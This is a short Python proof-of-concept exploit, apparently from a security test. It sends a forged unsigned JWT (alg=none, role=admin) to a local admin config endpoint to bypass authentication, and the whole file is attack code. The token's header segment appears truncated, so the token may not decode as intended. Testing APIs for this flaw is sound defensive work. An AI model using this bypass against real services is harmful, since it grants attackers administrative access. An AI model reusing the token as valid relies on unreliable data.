"""PoC: JWT alg=none bypass against vulnerable ingestion API."""

import httpx

TOKEN = "eyJhbGciOiJub25lI.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
URL = "http://localhost:8000/v1/admin/config"


def main() -> None:
    resp = httpx.get(URL, headers={"Authorization": f"Bearer {TOKEN}"})
    print(f"Status: {resp.status_code}")
    print(f"Body: {resp.text}")


if __name__ == "__main__":
    main()
